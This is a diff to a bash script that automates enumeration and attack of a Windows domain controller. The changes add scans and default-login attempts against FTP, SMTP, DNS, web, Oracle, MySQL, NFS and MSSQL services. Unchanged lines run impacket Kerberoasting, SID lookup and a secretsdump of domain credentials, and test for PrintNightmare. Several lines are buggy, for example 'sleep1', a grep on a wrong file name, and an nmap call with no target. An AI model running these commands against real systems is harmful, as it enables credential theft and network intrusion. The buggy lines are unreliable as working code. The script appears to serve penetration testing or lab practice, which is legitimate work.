@@ -47,7 +47,7 @@ read USERFILE
 
 echo -e '\E[31;35m' "Running NMAP to see what is open and putting in $DOMAINIP.txt, only looking at certain ports"; tput sgr0
 
-nmap -p 139,445,80,8080,8888,111,3389,5985,135,53,593,3269,636,389,88 -vv -Pn -n -T4 $DOMAINIP > $DOMAINIP.txt
+nmap -p 21,25,139,445,80,8080,8888,111,3389,5985,135,53,593,3269,636,389,88,2049,1521,3306,1433 -vv -Pn -n -T4 $DOMAINIP > $DOMAINIP.txt
 cat $DOMAINIP.txt | grep open > $DOMAINIP.open.txt
 rm -rf $DOMAINIP.txt
 mv $DOMAINIP.open.txt $DOMAINIP.txt
@@ -87,7 +87,20 @@ then
 		echo -e '\E[31;35m' "Not an answer or you spelled something wrong"; tput sgr0
 	fi
 fi	
+sleep 1
 
+if grep 21/tcp $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "FTP is open running another scan on it"; tput sgr0
+	nmap -p 21 -sC -sV -vv $DOMAINIP -Pn
+fi
+sleep1
+
+if grep 25/tcp $DOMAINIP.tput
+then
+	echo -e '\E[31;35m' "SMTP is running, utilizing NMAP to see some stuff"; tput sgr0
+	nmap --script=smtp* $DOMAINIP -Pn -vv -sC -sV -p 25
+fi
 sleep 1
 
 if grep 389/tcp $DOMAINIP.txt
@@ -96,12 +109,27 @@ then
 	ldapdomaindump ldap://$DOMAINIP:389
 	ldapsearch -H ldap://$DOMAINIP -x -b "DC=$DOMAIN,DC=local" '(objectclass=person)'; tput sgr0
 fi
+sleep 1
 
+if grep 53 $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "DNS is running, trying dig"; tput sgr0
+	nmap $DOMAINIP -p 53 -vv -sV -sC -Pn --script=dns-zone-transfer.nse,dns-brute.nse 
+	dig $DOMAIN @$DOMAINIP any
+fi
+sleep 1
+
+if grep 80/tcp $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "Web Server is running"; tput sgr0
+	nmap $DOMAINIP --script=http-vuln*,http-enum -p 80 -sC -sV -Pn
+fi
 sleep 1
 
 echo -e '\E[31;35m' "Getting Users SPNs if we can"; tput sgr0
 GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DOMAINIP
 GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DOMAINIP -request
+sleep 1
 
 echo -e '\E[31;35m' "Looking up SID"; tput sgr0
 lookupsid.py $DOMAIN/$USER:$PASS@$DOMAINIP
@@ -111,10 +139,11 @@ echo -e '\E[31;35m' "Trying to get Secrets Dump"; tput sgr0
 secretsdump.py "$DOMAIN/$USER:$PASS@$DOMAINIP" -just-dc
 sleep 1
 
-if grep 135/tcp $DOMAINIP.txt
+if grep 111/tcp $DOMAINIP.txt
 then
 	echo -e '\E[31;35m' "RPC is open, checking to see if anonymous login is allowed"; tput sgr0
 	rpcclient -U "" -N DOMAINIP
+	rpcinfo -p $DOMAINIP 
 fi
 sleep 1
 
@@ -125,7 +154,36 @@ then
 	smbclient -L \\\\$DOMAINIP\\
 	smbmap -H $DOMAINIP
 fi
+sleep 1
 
+if grep 1521/tcp $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "Oracle database is running, testing some stuff"; tput sgr0
+	tnscmd10g version -h $DOMAINIP
+	tnscmd10g status -h $DOMAINIP
+fi
+sleep 1
+
+if grep 3306/tcp $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "MySQL is open, trying some stuff"; tput sgr0
+	nmap --script=mysql-*
+	mysql -h $DOMAINIP -u root
+fi
+sleep 1
+
+if grep 2049/tcp $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "NFS Share is running"; tput sgr0
+	showmount -e $DOMAINIP
+fi
+sleep 1
+
+if grep 1433/tcp $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "MSSQL is running, checking some things"; tput sgr0
+	sqsh -s $DOMAINIP -U sa
+fi
 sleep 1
 
 echo -e '\E[31;40m' "Testing if vulnerable to Print Nightmare"; tput sgr0
